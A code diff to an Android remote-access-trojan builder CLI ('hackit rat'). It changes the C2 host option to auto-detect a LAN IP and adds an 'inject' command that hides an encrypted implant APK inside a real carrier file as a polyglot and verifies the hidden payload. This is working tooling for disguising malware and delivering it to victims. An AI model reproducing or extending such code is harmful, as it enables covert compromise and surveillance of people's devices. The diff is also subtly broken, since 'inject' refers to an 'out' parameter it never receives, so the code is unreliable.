@@ -47,7 +47,8 @@ def doctor(install):
 
 
 @rat.command()
-@click.option("--host", required=True, help="C2 base URL the implant calls, e.g. https://c2.example.com")
+@click.option("--host", default="auto", show_default=True,
+              help="C2 host — host, host:port, URL or auto (LAN IP)")
 @click.option("--label", default="android", help="implant label shown in the session list")
 @click.option("--interval", default=60000, show_default=True, help="beacon interval in ms (min 15000)")
 @click.option("--hide-icon", is_flag=True, help="disable the launcher alias at first run")
@@ -147,6 +148,42 @@ def setup(dest: str, no_ndk: bool, check: bool) -> None:
     print("  " + term.Good + f"[ok] toolchain ready at {root}" + term.RESET)
     print("  " + term.Dim + "next: hackit rat keygen --host https://c2.example.com && "
           "hackit rat build" + term.RESET)
+
+
+@rat.command()
+@click.argument("carrier", type=click.Path(exists=True, dir_okay=False))
+@click.option("--spec", default="", help="implant spec to build when no APK exists")
+@click.option("--apk", "apk_path", default="", help="payload APK (defaults to the newest build)")
+@click.option("--out", default="", help="output folder")
+def inject(carrier, spec, apk_path):
+    """Hide the implant inside a real file and verify the container."""
+    from hashlib import sha256
+
+    from . import polyglot
+
+    ext = os.path.splitext(carrier)[1].lower().lstrip(".")
+    if ext not in polyglot.MODES:
+        raise SystemExit(_colored(f"  unsupported carrier .{ext or '?'}", RED))
+    payload = apk_path or menu._latest_apk()
+    if not payload:
+        config = json.loads(open(os.path.join(HOME, "agent.json"), encoding="utf-8").read()) \
+            if os.path.exists(os.path.join(HOME, "agent.json")) else None
+        if not config:
+            raise SystemExit(_colored("  no APK and no agent.json — run keygen + build", RED))
+        payload = builder.build(config, out=os.path.join(HOME, "dist", "agent.apk"))
+    folder = out or os.path.join(HOME, "dist", (spec or "inject"))
+    result = polyglot.build(carrier, payload, out_dir=folder, encrypt=True)
+    blob = polyglot.carve(open(result.carrier, "rb").read(), result.start or polyglot.START)
+    if result.sealed:
+        blob = polyglot.open_payload(blob, bytes.fromhex(result.key))
+    ok = bool(polyglot.verify(result.carrier).get("ok")) \
+        and sha256(blob).hexdigest() == result.digest
+    click.echo(_colored(f"  carrier   {result.carrier}", B_GREEN))
+    click.echo(_colored(f"  manifest  {result.manifest}", DIM))
+    click.echo(_colored("  verify    " + ("ok — payload byte-identical" if ok else "FAILED"),
+                        GREEN if ok else RED))
+    if not ok:
+        raise SystemExit(1)
 
 
 @rat.command()
